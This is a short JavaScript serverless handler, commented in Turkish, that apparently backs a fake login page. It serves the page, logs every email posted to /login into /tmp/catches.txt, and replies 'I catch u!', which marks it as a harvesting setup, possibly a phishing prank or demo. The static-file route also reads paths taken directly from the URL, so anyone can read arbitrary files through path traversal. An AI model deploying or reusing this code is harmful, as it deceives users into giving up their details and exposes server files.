const fs = require('fs').promises;
const path = require('path');

exports.handler = async (event, context) => {
  const { path: urlPath } = event;
  
  try {
    if (urlPath === '/' || urlPath === '') {
      // Ana sayfa için HTML döndür
      const html = await fs.readFile('./templates/login.html', 'utf8');
      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'text/html',
        },
        body: html,
      };
    }
    
    if (urlPath === '/login') {
      // Login endpoint'i için
      if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method not allowed' };
      }
      
      const body = JSON.parse(event.body);
      const email = body.email;
      
      // Email'i kaydet
      const logEntry = `Email: ${email}\n${'-'.repeat(50)}\n`;
      await fs.appendFile('/tmp/catches.txt', logEntry);
      
      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: 'I catch u!' }),
      };
    }
    
    if (urlPath.startsWith('/static/')) {
      // Statik dosyalar için
      const filePath = `.${urlPath}`;
      const content = await fs.readFile(filePath, 'utf8');
      const contentType = urlPath.endsWith('.css') 
        ? 'text/css' 
        : urlPath.endsWith('.jpg') 
          ? 'image/jpeg' 
          : 'text/plain';
      
      return {
        statusCode: 200,
        headers: {
          'Content-Type': contentType,
        },
        body: content,
      };
    }
    
    return {
      statusCode: 404,
      body: 'Not found',
    };
    
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message }),
    };
  }
}; 